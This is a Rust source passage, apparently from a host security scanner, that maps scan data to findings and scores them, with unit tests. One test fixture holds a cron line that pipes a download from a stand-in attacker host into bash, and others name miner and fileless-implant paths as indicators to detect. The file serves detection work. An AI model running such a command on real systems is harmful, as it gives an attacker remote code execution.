            title: "Privileged Docker containers detected".to_string(),
            category: Category::Security,
            weight: 10,
            evidence: "At least one container is running in privileged mode".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.4"),
        });
    }
    if has_dangerous_caps {
        findings.push(Finding {
            id: "DOCK-004",
            source: Scanner::Docker,
            title: "Docker containers with dangerous capabilities".to_string(),
            category: Category::Security,
            weight: 10,
            evidence:
                "At least one container has elevated kernel capabilities (SYS_ADMIN/NET_ADMIN)"
                    .to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.5"),
        });
    }

    let mut tampered: Vec<String> = Vec::new();
    for c in &report.topology.containers {
        if c.privileged {
            continue;
        }
        let Some(bnd) = c.runtime_bounding_caps else {
            continue;
        };
        let undeclared = crate::scanners::capabilities::undeclared_escape_caps(bnd, &c.cap_add);
        if !undeclared.is_empty() {
            tampered.push(format!(
                "{} holds undeclared [{}]",
                c.name,
                undeclared.join(", ")
            ));
        }
    }
    if !tampered.is_empty() {
        findings.push(Finding {
            id: "DOCK-010",
            source: Scanner::Docker,
            title: "ACTIVE COMPROMISE: container runtime capabilities exceed declared config"
                .to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!(
                "{} container(s) with runtime cap tampering: {}",
                tampered.len(),
                tampered.join("; ")
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.2.5"),
        });
    }

    let mut has_socket_or_root = false;
    let mut has_sensitive_rw = false;

    for container in &report.topology.containers {
        for m in &container.sensitive_mounts {
            if m == "DOCKER_SOCKET" || m == "HOST_ROOT" {
                has_socket_or_root = true;
            } else if m.ends_with("(rw)") {
                has_sensitive_rw = true;
            }
        }
    }

    if has_socket_or_root {
        findings.push(Finding {
            id: "DOCK-005",
            source: Scanner::Docker,
            title: "Container mounts runtime control socket or host root".to_string(),
            category: Category::Security,
            weight: 15,
            evidence: format!(
                "A container bind-mounts the {} control socket or / (host takeover primitive)",
                if report.topology.runtime_name.is_empty() {
                    "container runtime"
                } else {
                    &report.topology.runtime_name
                }
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.31"),
        });
    }
    if has_sensitive_rw {
        findings.push(Finding {
            id: "DOCK-006",
            source: Scanner::Docker,
            title: "Container mounts sensitive host path (writable)".to_string(),
            category: Category::Security,
            weight: 10,
            evidence: "A container has a writable bind-mount of a sensitive host directory"
                .to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.7"),
        });
    }

    let mut oom_names: Vec<&str> = Vec::new();
    let mut loop_names: Vec<&str> = Vec::new();
    let mut unhealthy_names: Vec<&str> = Vec::new();

    for c in &report.topology.containers {
        if c.oom_killed {
            oom_names.push(&c.name);
        }
        if c.restart_count >= RESTART_LOOP_THRESHOLD || c.state == "restarting" {
            loop_names.push(&c.name);
        }
        if c.health_status.as_deref() == Some("unhealthy") {
            unhealthy_names.push(&c.name);
        }
    }

    if !oom_names.is_empty() {
        oom_names.sort_unstable();
        let list = oom_names.join(", ");
        findings.push(Finding {
            id: "DOCK-007",
            source: Scanner::Docker,
            title: "Containers killed by OOM".to_string(),
            category: Category::Reliability,
            weight: RISK_CONTAINER_OOM,
            evidence: format!("OOMKilled: {}", list),
            suppressed: None,
            cis_ref: None,
        });
    }
    if !loop_names.is_empty() {
        loop_names.sort_unstable();
        let list = loop_names.join(", ");
        findings.push(Finding {
            id: "DOCK-008",
            source: Scanner::Docker,
            title: "Containers in restart loop".to_string(),
            category: Category::Reliability,
            weight: RISK_CONTAINER_RESTART_LOOP,
            evidence: format!(
                "restart_count >= {} or currently restarting: {}",
                RESTART_LOOP_THRESHOLD, list
            ),
            suppressed: None,
            cis_ref: None,
        });
    }
    if !unhealthy_names.is_empty() {
        unhealthy_names.sort_unstable();
        let list = unhealthy_names.join(", ");
        findings.push(Finding {
            id: "DOCK-009",
            source: Scanner::Docker,
            title: "Unhealthy containers (failing healthcheck)".to_string(),
            category: Category::Reliability,
            weight: RISK_CONTAINER_UNHEALTHY,
            evidence: format!("unhealthy: {}", list),
            suppressed: None,
            cis_ref: None,
        });
    }

    if report
        .host
        .failed_services
        .iter()
        .any(|s| s.contains(".service"))
    {
        findings.push(Finding {
            id: "REL-001",
            source: Scanner::Host,
            title: "Failed systemd services".to_string(),
            category: Category::Reliability,
            weight: RISK_FAILED_SERVICES,
            evidence: format!("{} failed service(s)", report.host.failed_services.len()),
            suppressed: None,
            cis_ref: None,
        });
    }

    if report.host.backup_tools.is_empty() {
        findings.push(Finding {
            id: "REL-002",
            source: Scanner::Host,
            title: "No backup tools detected".to_string(),
            category: Category::Reliability,
            weight: RISK_NO_BACKUP,
            evidence: "No automated backup tools found".to_string(),
            suppressed: None,
            cis_ref: None,
        });
    }

    if report.host.oom_kills > 0 {
        findings.push(Finding {
            id: "REL-003",
            source: Scanner::Host,
            title: "OOM kills present".to_string(),
            category: Category::Reliability,
            weight: RISK_OOM_KILLS,
            evidence: format!("{} OOM kill(s) detected", report.host.oom_kills),
            suppressed: None,
            cis_ref: None,
        });
    }

    if !report.host.ntp_synchronized {
        findings.push(Finding {
            id: "HYG-001",
            source: Scanner::Host,
            title: "NTP not synchronized".to_string(),
            category: Category::Hygiene,
            weight: RISK_NTP_NOT_SYNCED,
            evidence: "Time not synchronized".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 2.2.1.1"),
        });
    }

    // R24-92: remove findings that come from scanners which panicked.
    // A panic means Default values, not observations.
    findings.retain(|f| !finding_from_failed_scanner(f, report));

    // R25-26: a failed scanner means the surfaces it owned were never observed.
    // Record that fact in the findings; verdict is Incomplete, not clean.
    for scanner in &report.failed_scanners {
        findings.push(Finding {
            id: "COV-001",
            source: Scanner::Orchestrator,
            title: "Scanner panicked; verdict incomplete".to_string(),
            category: Category::Hygiene,
            weight: 0,
            evidence: format!(
                "scanner `{scanner}` panicked; findings derived from it were withheld — \
                 this host's verdict is INCOMPLETE, not clean"
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    findings
}

// ── Scoring from findings ──────────────────────────────────

#[allow(dead_code)]
pub struct ScoredReport {
    pub total: u8,
    pub security: u8,
    pub reliability: u8,
    pub hygiene: u8,
    pub findings: Vec<Finding>,
}

/// The security axis alone: what the scan FOUND.
/// Completeness — what the scan could SEE — lives in `Coverage` and is never
/// collapsed into this value: a host whose scanner panicked can still hold a
/// confirmed Critical, and folding the two axes into one enum hid it
/// (R25-44/R25-74).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SecurityVerdict {
    Clean,
    Critical,
    Compromised,
}

impl SecurityVerdict {
    /// Explicit, not `derive(Ord)`: with a derive, reordering the declaration
    /// silently changes fleet aggregation and nothing fails to compile.
    fn rank(self) -> u8 {
        match self {
            Self::Clean => 0,
            Self::Critical => 1,
            Self::Compromised => 2,
        }
    }

    pub fn worse(self, other: Self) -> Self {
        if self.rank() >= other.rank() {
            self
        } else {
            other
        }
    }
}

pub fn security_verdict_from_findings(findings: &[Finding]) -> SecurityVerdict {
    let flags = CriticalFlags::from_findings(findings);
    if flags.compromised_host {
        SecurityVerdict::Compromised
    } else if flags.has_critical() {
        SecurityVerdict::Critical
    } else {
        SecurityVerdict::Clean
    }
}

/// Fail-open guard for the R24-92 filter, previously inside
/// `verdict_from_findings` (R25-46/R25-59). Called once per report.
pub fn warn_unmapped_scanners(failed_scanners: &[String]) {
    for name in failed_scanners {
        if Scanner::from_name(name).is_none() {
            coverage::record(format!(
                "scoring: failed scanner `{name}` has no Scanner variant — findings \
                 derived from it were NOT withheld from the verdict"
            ));
        }
    }
}

/// Emit coverage warnings for facts discovered during `evaluate` that are not
/// findings but still reduce confidence. Extracted out so `evaluate` remains a
/// pure function and the side effect happens exactly once per report
/// (R25-95).
// macOS / --no-default-features builds without `local-scan` compile this out of
// production and see only the call site under `cfg(feature = "local-scan")`.
#[cfg_attr(not(feature = "local-scan"), allow(dead_code))]
pub fn warn_evaluate_side_effects(exec_start_injections: &[crate::models::ExecStartFinding]) {
    let unknown = exec_start_injections
        .iter()
        .filter(|f| f.writability == crate::models::ExecWritability::Unknown)
        .count();

    if unknown > 0 {
        coverage::record(format!(
            "exec_provenance: {unknown} target(s) could not be stat'ed (EACCES) — \
             writability UNVERIFIED, not assumed safe"
        ));
    }
}

#[allow(dead_code)]
pub fn score(findings: Vec<Finding>) -> ScoredReport {
    let mut sec = 0u8;
    let mut rel = 0u8;
    let mut hyg = 0u8;

    for f in &findings {
        if f.suppressed.is_some() {
            continue;
        }
        match f.category {
            Category::Security => sec = sec.saturating_add(f.weight),
            Category::Reliability => rel = rel.saturating_add(f.weight),
            Category::Hygiene => hyg = hyg.saturating_add(f.weight),
        }
    }

    ScoredReport {
        total: (sec.min(60) + rel.min(30) + hyg.min(10)).min(100),
        security: sec.min(60),
        reliability: rel.min(30),
        hygiene: hyg.min(10),
        findings,
    }
}

// ── Legacy CriticalFlags (unchanged API, backed by findings) ──

pub struct CriticalFlags {
    pub firewall_disabled: bool,
    pub ssh_root_login: bool,
    pub security_updates: bool,
    pub critical_ssl: bool,
    pub failed_services: bool,
    pub no_backups: bool,
    pub sudo_nopasswd: bool,
    pub ntp_not_synced: bool,
    pub sysctl_issues_count: usize,
    pub compromised_host: bool,
}

impl CriticalFlags {
    #[allow(dead_code)] // used by tests; main binary now uses security_verdict_from_findings
    pub fn from_report(report: &AgentReport) -> Self {
        let findings = evaluate(report);
        Self::from_findings(&findings)
    }

    pub fn from_findings(findings: &[Finding]) -> Self {
        let has = |id: &str| {
            findings
                .iter()
                .any(|f| f.id == id && f.suppressed.is_none())
        };
        const IOC_IDS: [&str; 16] = [
            "SEC-015", "SEC-016", "SEC-017", "SEC-019", "SEC-020", "SEC-021", "SEC-022", "SEC-023",
            "SEC-024", "SEC-028", "SEC-040", "DOCK-010", "SEC-042", "SEC-043", "SEC-052",
            "SEC-055",
        ];

        debug_assert!(
            findings.iter().all(|f| {
                !(IOC_IDS.contains(&f.id) && f.suppressed.is_none()) || f.weight >= 55
            }),
            "IOC_IDS finding with sub-IoC weight — exit-3 semantics broken"
        );

        let count_sysctl = findings
            .iter()
            .filter(|f| f.id == "SEC-007" && f.suppressed.is_none())
            .count();

        Self {
            firewall_disabled: has("SEC-001"),
            ssh_root_login: has("SEC-002"),
            security_updates: has("SEC-003"),
            critical_ssl: has("SEC-004"),
            failed_services: has("REL-001"),
            no_backups: has("REL-002"),
            sudo_nopasswd: has("SEC-005"),
            ntp_not_synced: has("HYG-001"),
            sysctl_issues_count: count_sysctl,
            compromised_host: IOC_IDS.iter().any(|&id| has(id)),
        }
    }

    pub fn has_critical(&self) -> bool {
        self.firewall_disabled
            || self.ssh_root_login
            || self.security_updates
            || self.critical_ssl
            || self.failed_services
            || self.no_backups
            || self.sudo_nopasswd
            || self.ntp_not_synced
            || self.sysctl_issues_count >= SYSCTL_CRITICAL_THRESHOLD
    }

    #[allow(dead_code)]
    pub fn is_compromised(&self) -> bool {
        self.compromised_host
    }
}

// ── New classification helpers for file capabilities and setuid files ─────

static KNOWN_CAP_BINARIES: &[(&str, &[&str])] = &[
    ("ping", &["CAP_NET_RAW"]),
    ("ping4", &["CAP_NET_RAW"]),
    ("ping6", &["CAP_NET_RAW"]),
    ("mtr", &["CAP_NET_RAW"]),
    ("mtr-packet", &["CAP_NET_ADMIN", "CAP_NET_RAW"]),
    ("dumpcap", &["CAP_NET_ADMIN", "CAP_NET_RAW"]),
];

pub(crate) fn classify_cap_binary(
    fc: &crate::models::FileCapFinding,
    provenance_source: &ProvenanceSource,
) -> (u8, &'static str) {
    if fc.package.is_some() {
        return (0, "owned by installed package");
    }

    let basename = std::path::Path::new(&fc.path)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("");
    for (name, allowed) in KNOWN_CAP_BINARIES {
        if basename == *name {
            let within_baseline = fc.capabilities.iter().all(|c| {
                let bare = c.strip_suffix("(inh)").unwrap_or(c);
                allowed.contains(&bare)
            });
            return if within_baseline {
                (0, "known binary with expected capabilities")
            } else {
                (8, "known binary carrying capabilities beyond its baseline")
            };
        }
    }

    if matches!(
        *provenance_source,
        ProvenanceSource::Unavailable | ProvenanceSource::PartialApk
    ) {
        return (2, "package DB unattributable; no structural match");
    }

    (8, "file not owned by any package")
}

pub(crate) fn classify_setuid(
    f: &crate::models::SetuidFinding,
    provenance_source: &ProvenanceSource,
) -> (u8, &'static str) {
    if f.package.is_some() {
        return (0, "owned by installed package");
    }

    let in_system_dir = [
        "/usr/bin/",
        "/usr/sbin/",
        "/usr/local/bin/",
        "/usr/local/sbin/",
        "/bin/",
        "/sbin/",
        "/usr/lib/",
        "/usr/libexec/",
        "/usr/local/lib/",
        "/usr/lib64/",
    ]
    .iter()
    .any(|d| f.path.starts_with(d));

    match (*provenance_source, in_system_dir, f.root_owner) {
        (ProvenanceSource::Unavailable | ProvenanceSource::PartialApk, true, true) => {
            (2, "package DB unattributable; structural fallback")
        }
        (ProvenanceSource::Unavailable | ProvenanceSource::PartialApk, true, false) => {
            (10, "non-root setuid in system dir, DB unattributable")
        }
        (ProvenanceSource::Unavailable | ProvenanceSource::PartialApk, false, _) => {
            (14, "setuid outside system dirs, DB unattributable")
        }
        (_, true, true) => (6, "root-owned setuid in system dir, owned by NO package"),
        (_, true, false) => (12, "non-root setuid in a system dir"),
        (_, false, _) => (14, "setuid outside system binary directories"),
    }
}

// ── Tests ─────────────────────────────────────────────────
// R25-53(e): IoC tests now go through evaluate + CriticalFlags::from_findings,
// matching the production path (evaluate -> from_findings -> security_verdict_from_findings).
#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::*;

    fn minimal_report() -> AgentReport {
        AgentReport {
            scan_id: "test-id".to_string(),
            timestamp: "2025-01-01T00:00:00Z".to_string(),
            version: "0.4.0".to_string(),
            duration_secs: 1.0,
            risk_score: 0,
            is_root_execution: true,
            scan_warnings: Vec::new(),
            coverage_warnings: Vec::new(),
            failed_scanners: Vec::new(),
            remote_privileged: None,
            scoring_version: 1,
            self_integrity: None,
            host: HostInfo::default(),
            databases: vec![],
            network: NetworkInfo::default(),
            storage: StorageInfo::default(),
            topology: TopologyInfo::default(),
            security: SecurityInfo::default(),
            packages: PackagesInfo::default(),
        }
    }

    fn rel_container(name: &str) -> ContainerInfo {
        ContainerInfo {
            name: name.into(),
            image: "img".into(),
            state: "running".into(),
            status: "Up 2 hours".into(),
            size_mb: 0,
            log_size_mb: 0,
            ports: vec![],
            mounts: vec![],
            privileged: false,
            memory_limit_mb: Some(512),
            cpu_limit: Some(1.0),
            cap_add: vec![],
            sensitive_mounts: vec![],
            restart_count: 0,
            oom_killed: false,
            health_status: None,
            rw_size_mb: 0,
            runtime_bounding_caps: None,
        }
    }

    #[test]
    fn risk_score_never_exceeds_100() {
        let mut r = minimal_report();
        r.network.firewall_active = false;
        r.security.ssh_root_login_enabled = true;
        r.security.ssh_password_auth_enabled = true;
        r.host.backup_tools = vec![];
        r.host.oom_kills = 5;
        r.host.ntp_synchronized = false;
        r.security.sudo_nopasswd_entries = vec!["ALL".to_string()];
        r.security.sysctl_issues = vec!["a".to_string(); 10];
        for _ in 0..5 {
            r.packages.upgradable.push(UpgradablePackage {
                name: "pkg".to_string(),
                current_version: "1.0".to_string(),
                new_version: "1.1".to_string(),
                is_security: true,
            });
        }

        let scored = score(evaluate(&r));
        assert!(scored.total <= 100);
    }

    #[test]
    fn new_scoring_caps_categories() {
        let mut r = minimal_report();
        r.network.firewall_active = false;
        r.security.ssh_root_login_enabled = true;
        r.security.ssh_password_auth_enabled = true;
        r.security.sudo_nopasswd_entries = vec!["ALL".to_string()];
        let scored = score(evaluate(&r));
        assert!(scored.security <= 60);
        assert!(scored.total <= 100);
    }

    #[test]
    fn suppressed_findings_not_scored() {
        let mut r = minimal_report();
        r.network.firewall_active = true;
        r.security.ssh_password_auth_enabled = false;
        r.host.backup_tools = vec!["restic".to_string()];
        r.host.ntp_synchronized = true;
        r.security.sysctl_issues = vec!["net.ipv4.ip_forward=1 (expected 0)".to_string()];
        r.topology.runtime_active = true;

        let findings = evaluate(&r);
        assert!(findings.iter().any(|f| f.suppressed.is_some()));
        let scored = score(findings);
        assert_eq!(scored.total, 0);
    }

    #[test]
    fn docker_reliability_findings() {
        let mut r = minimal_report();
        let mut oom = rel_container("db");
        oom.oom_killed = true;
        let mut looper = rel_container("worker");
        looper.restart_count = 5;
        let mut live = rel_container("api");
        live.state = "restarting".into();
        let mut sick = rel_container("web");
        sick.health_status = Some("unhealthy".into());
        let ok = rel_container("cache");
        r.topology.containers = vec![oom, looper, live, sick, ok];

        let findings = evaluate(&r);
        let ids: Vec<&str> = findings.iter().map(|f| f.id).collect();
        assert!(ids.contains(&"DOCK-007"));
        assert!(ids.contains(&"DOCK-008"));
        assert!(ids.contains(&"DOCK-009"));
        assert!(
            findings
                .iter()
                .filter(|f| f.id.starts_with("DOCK-00"))
                .all(|f| !f.evidence.contains("cache"))
        );
        assert!(score(findings).reliability <= 30);
    }

    #[test]
    fn cap001_weight_escalates_on_global_exposure() {
        use crate::models::{PortInfo, ProcCapFinding};
        let mut r = minimal_report();
        r.security.capability_audit = vec![ProcCapFinding {
            pid: 4242,
            comm: "nginx".into(),
            euid: 101,
            effective: 0xa804_25fb,
            permitted: 0xa804_25fb,
            inheritable: 0,
            bounding: 0xa804_25fb,
            ambient: 0,
            no_new_privs: Some(false),
            seccomp: Some(2),
            critical_caps: vec!["CAP_NET_RAW".into()],
            reason: None,
        }];
        r.network.listening_ports = vec![PortInfo {
            protocol: "tcp".into(),
            port: "8080".into(),
            process: "nginx".into(),
            bind_address: "0.0.0.0".into(),
            pid: Some(4242),
            exe_path: None,
        }];
        let cap = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "CAP-001")
            .expect("CAP-001 present");
        assert_eq!(cap.weight, 20);
        assert!(cap.evidence.contains("1 exposed globally"));

        r.network.listening_ports[0].bind_address = "127.0.0.1".into();
        let cap = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "CAP-001")
            .unwrap();
        assert_eq!(cap.weight, 8);
        assert!(cap.evidence.contains("1 of these listening"));
        assert!(!cap.evidence.contains("exposed globally on"));

        r.network.listening_ports[0].bind_address = "::ffff:0.0.0.0".into();
        let cap = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "CAP-001")
            .unwrap();
        assert_eq!(cap.weight, 20);
    }

    #[test]
    fn sec015_fires_only_on_full_ioc_triad() {
        use crate::models::{PortInfo, ProcCapFinding};
        let cap = |pid| ProcCapFinding {
            pid,
            comm: "kdevtmpfsi".into(),
            euid: 1000,
            effective: 0x20_0000,
            permitted: 0x20_0000,
            inheritable: 0,
            bounding: 0x20_0000,
            ambient: 0,
            no_new_privs: Some(false),
            seccomp: Some(0),
            critical_caps: vec!["CAP_SYS_ADMIN".into()],
            reason: None,
        };
        let port = |bind: &str, exe: Option<&str>, pid| PortInfo {
            protocol: "tcp".into(),
            port: "31337".into(),
            process: "x".into(),
            bind_address: bind.into(),
            pid,
            exe_path: exe.map(Into::into),
        };
        let fires = |r: &AgentReport| evaluate(r).iter().any(|f| f.id == "SEC-015");

        let mut r = minimal_report();
        r.security.capability_audit = vec![cap(4242)];
        r.network.listening_ports = vec![port("0.0.0.0", Some("/tmp/kdevtmpfsi"), Some(4242))];
        assert!(fires(&r));
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-015")
            .unwrap();
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("4242"));
        assert!(f.evidence.contains("/tmp/kdevtmpfsi"));
        assert!(f.evidence.contains("CAP_SYS_ADMIN"));

        r.network.listening_ports = vec![port("127.0.0.1", Some("/tmp/kdevtmpfsi"), Some(4242))];
        assert!(!fires(&r), "loopback bind is not reachable");
        r.network.listening_ports = vec![port("0.0.0.0", Some("/usr/bin/nginx"), Some(4242))];
        assert!(!fires(&r), "system path is not ephemeral");
        r.network.listening_ports = vec![port("0.0.0.0", Some("/tmp/kdevtmpfsi"), Some(9999))];
        assert!(
            !fires(&r),
            "pid absent from capability_audit is only SEC-013"
        );

        r.network.listening_ports = vec![port("::ffff:0.0.0.0", Some("/dev/shm/x"), Some(4242))];
        assert!(fires(&r));
    }

    #[test]
    fn scoring_version_is_bumped_when_sec005_weighting_changes() {
        // Guard for R26-22: if a future change makes the same sudoers input score
        // differently, this test fails and SCORING_VERSION must be bumped with it.
        let mut r = minimal_report();
        r.security.sudo_nopasswd_entries = vec![format!(
            "/etc/sudoers: deploy ALL=(ALL) NOPASSWD: MAINTENANCE {}",
            crate::models::SUDO_ALL_MARKER
        )];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-005")
            .unwrap();
        assert_eq!((SCORING_VERSION, f.weight), (13, 15));
    }
    #[test]
    fn sec016_reads_suspicious_processes() {
        use crate::models::SuspiciousProcess;
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![SuspiciousProcess {
            pid: 1337,
            name: "xmrig".into(),
            exe_path: Some("/tmp/xmrig".into()),
            ..Default::default()
        }];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-016")
            .unwrap();
        assert_eq!(f.weight, 60);
        assert!(
            f.evidence.contains("xmrig")
                && f.evidence.contains("1337")
                && f.evidence.contains("/tmp/xmrig")
        );

        let clean = minimal_report();
        assert!(!evaluate(&clean).iter().any(|f| f.id == "SEC-016"));
    }

    #[test]
    fn sec017_flags_fileless_and_sec016_excludes_it() {
        use crate::models::SuspiciousProcess;
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![
            SuspiciousProcess {
                pid: 42,
                name: "obfuscated".into(),
                exe_path: Some("/dev/shm/loader".into()),
                is_deleted: true,
                euid: 1000,
                is_mimic: false,
                self_attributed: None,
            },
            SuspiciousProcess {
                pid: 7,
                name: "xmrig".into(),
                exe_path: Some("/tmp/xmrig".into()),
                is_deleted: false,
                euid: 1000,
                is_mimic: false,
                self_attributed: None,
            },
        ];
        let ids: Vec<&str> = evaluate(&r).iter().map(|f| f.id).collect();
        assert!(ids.contains(&"SEC-016"));
        assert!(ids.contains(&"SEC-017"));

        let sec016 = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-016")
            .unwrap();
        assert!(sec016.evidence.contains("xmrig"));
        assert!(
            !sec016.evidence.contains("obfuscated"),
            "fileless non-name must not be in SEC-016"
        );
        let sec017 = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-017")
            .unwrap();
        assert!(
            sec017.evidence.contains("obfuscated") && sec017.evidence.contains("/dev/shm/loader")
        );
        assert!(
            !sec017.evidence.contains("xmrig"),
            "live miner must not be in SEC-017"
        );
    }

    #[test]
    fn sec017_self_attributed_split_and_sec032() {
        use crate::models::SuspiciousProcess;
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![
            SuspiciousProcess {
                pid: 1337,
                name: "miner".into(),
                exe_path: Some("/dev/shm/miner".into()),
                is_deleted: true,
                euid: 1000,
                is_mimic: false,
                self_attributed: None,
            },
            SuspiciousProcess {
                pid: 4242,
                name: "owlzops-mapper".into(),
                exe_path: Some("/tmp/owlzops-mapper".into()),
                is_deleted: true,
                euid: 0,
                is_mimic: false,
                self_attributed: Some("test-self".into()),
            },
        ];
        let findings = evaluate(&r);
        let sec017 = findings
            .iter()
            .find(|f| f.id == "SEC-017")
            .expect("SEC-017 missing");
        assert!(sec017.evidence.contains("miner"));
        assert!(!sec017.evidence.contains("owlzops-mapper"));
        let sec032 = findings
            .iter()
            .find(|f| f.id == "SEC-032")
            .expect("SEC-032 missing");
        assert!(sec032.evidence.contains("owlzops-mapper"));
        assert!(sec032.suppressed.is_some());
        let sec019 = findings.iter().find(|f| f.id == "SEC-019");
        assert!(sec019.is_none() || !sec019.unwrap().evidence.contains("owlzops-mapper"));
        assert!(CriticalFlags::from_findings(&findings).compromised_host);
    }

    #[test]
    fn sec017_evidence_distinguishes_memfd_from_ondisk() {
        use crate::models::SuspiciousProcess;
        let mut r = minimal_report();
        r.security.suspicious_processes = vec![
            SuspiciousProcess {
                pid: 10,
                name: "malware".into(),
                exe_path: Some("/tmp/malware".into()),
                is_deleted: true,
                euid: 1000,
                is_mimic: false,
                self_attributed: None,
            },
            SuspiciousProcess {
                pid: 20,
                name: "stealth".into(),
                exe_path: Some("/memfd:stealth".into()),
                is_deleted: true,
                euid: 1000,
                is_mimic: false,
                self_attributed: None,
            },
        ];
        let sec017 = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-017")
            .unwrap();
        assert!(sec017.evidence.contains("deleted from /tmp/malware"));
        assert!(sec017.evidence.contains("executing in-memory (memfd)"));
        assert!(!sec017.evidence.contains("deleted from /memfd:stealth"));
    }

    #[test]
    fn sec018_detects_critical_cron() {
        use crate::models::{CronJob, CronSeverity};
        let mut r = minimal_report();
        r.host.cron_jobs = vec![
            CronJob {
                command: "0 3 * * * root /usr/bin/backup".into(),
                severity: CronSeverity::Ok,
            },
            CronJob {
                command: "* * * * * root curl http://evil.com | bash -c".into(),
                severity: CronSeverity::Critical,
            },
        ];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-018")
            .expect("SEC-018 missing");
        assert_eq!(f.weight, 20);
        assert!(f.evidence.contains("curl"));
    }

    #[test]
    fn dock010_flags_undeclared_runtime_caps() {
        use crate::models::ContainerInfo;
        let base = |bnd: Option<u64>, cap_add: Vec<String>, privileged: bool| ContainerInfo {
            name: "web".into(),
            image: "nginx".into(),
            state: "running".into(),
            status: "Up".into(),
            size_mb: 0,
            log_size_mb: 0,
            ports: vec![],
            mounts: vec![],
            privileged,
            memory_limit_mb: None,
            cpu_limit: None,
            cap_add,
            sensitive_mounts: vec![],
            restart_count: 0,
            oom_killed: false,
            health_status: None,
            rw_size_mb: 0,
            runtime_bounding_caps: bnd,
        };
        let tampered = 0x0000_0000_a804_25fb | (1u64 << 21);

        let mut r = minimal_report();
        r.topology.containers = vec![base(Some(tampered), vec![], false)];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "DOCK-010")
            .expect("DOCK-010 fires");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("web") && f.evidence.contains("CAP_SYS_ADMIN"));

        r.topology.containers = vec![base(Some(tampered), vec!["SYS_ADMIN".into()], false)];
        assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));

        r.topology.containers = vec![base(Some(tampered), vec![], true)];
        assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));

        r.topology.containers = vec![base(Some(0x0000_0000_a804_25fb), vec![], false)];
        assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));

        r.topology.containers = vec![base(None, vec![], false)];
        assert!(!evaluate(&r).iter().any(|f| f.id == "DOCK-010"));
    }

    #[test]
    fn sec019_root_fileless_fires_without_audit_and_nonroot_joins() {
        use crate::models::{ProcCapFinding, SuspiciousProcess};
        let fires = |r: &AgentReport| evaluate(r).iter().any(|f| f.id == "SEC-019");
        let cap = |pid: u32, caps: Vec<String>| ProcCapFinding {
            pid,
            comm: "obfuscated".into(),
            euid: 1000,
            effective: 1 << 21,
            permitted: 1 << 21,
            inheritable: 0,
            bounding: 0,
            ambient: 0,
            no_new_privs: Some(false),
            seccomp: Some(0),
            critical_caps: caps,
            reason: None,
        };
        let fileless =
            |pid: u32, euid: u32, exe: Option<&str>, self_attr: Option<&str>| SuspiciousProcess {
                pid,
                name: "obfuscated".into(),
                exe_path: exe.map(Into::into),
                is_deleted: true,
                euid,
                is_mimic: false,
                self_attributed: self_attr.map(Into::into),
            };

        let mut r = minimal_report();
        r.security.suspicious_processes = vec![fileless(1, 0, Some("/dev/shm/loader"), None)];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-019")
            .expect("root fileless must fire SEC-019 without a join");
        assert_eq!(f.weight, 60);
        assert!(f.evidence.contains("pid 1"));
        assert!(
            f.evidence
                .contains("root-run fileless implant, full kernel capabilities by default")
        );
        assert!(f.evidence.contains("deleted from /dev/shm/loader"));

        let mut r = minimal_report();
        r.security.suspicious_processes = vec![fileless(42, 1000, Some("/dev/shm/loader"), None)];
        r.security.capability_audit = vec![cap(42, vec!["CAP_SYS_ADMIN".into(), "CAP_BPF".into()])];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-019")
            .unwrap();
        assert!(f.evidence.contains("holds [CAP_SYS_ADMIN, CAP_BPF]"));
        assert!(!f.evidence.contains("root-run"));

        let mut r = minimal_report();
        r.security.suspicious_processes = vec![fileless(42, 1000, Some("/dev/shm/loader"), None)];
        assert!(
            !fires(&r),
            "non-root fileless without caps must not raise SEC-019"
        );
        assert!(evaluate(&r).iter().any(|f| f.id == "SEC-017"));

        let mut r = minimal_report();
        r.security.suspicious_processes = vec![fileless(42, 1000, Some("/dev/shm/loader"), None)];
        r.security.capability_audit = vec![cap(42, vec![])];
        assert!(!fires(&r), "ambient-only entry must not raise SEC-019");

        let mut r = minimal_report();
        r.security.suspicious_processes = vec![fileless(900, 0, Some("/memfd:stealth"), None)];
        let f = evaluate(&r)
            .into_iter()
            .find(|f| f.id == "SEC-019")
            .unwrap();
        assert!(f.evidence.contains("executing in-memory (memfd)"));
        assert!(f.evidence.contains("root-run fileless implant"));
        assert!(!f.evidence.contains("deleted from /memfd:"));

        let mut r = minimal_report();
        r.security.suspicious_processes =
            vec![fileless(7, 0, Some("/tmp/owlzops-mapper"), Some("self"))];
        assert!(!fires(&r), "self-attributed must not raise SEC-019");
    }

    #[test]
    fn compromised_host_flag_tracks_ioc_findings() {
        use crate::models::SuspiciousProcess;

        let clean = minimal_report();
        let findings = evaluate(&clean);
        let cf = CriticalFlags::from_findings(&findings);
        assert!(!cf.compromised_host);
        assert!(!cf.is_compromised());

        let mut r = minimal_report();
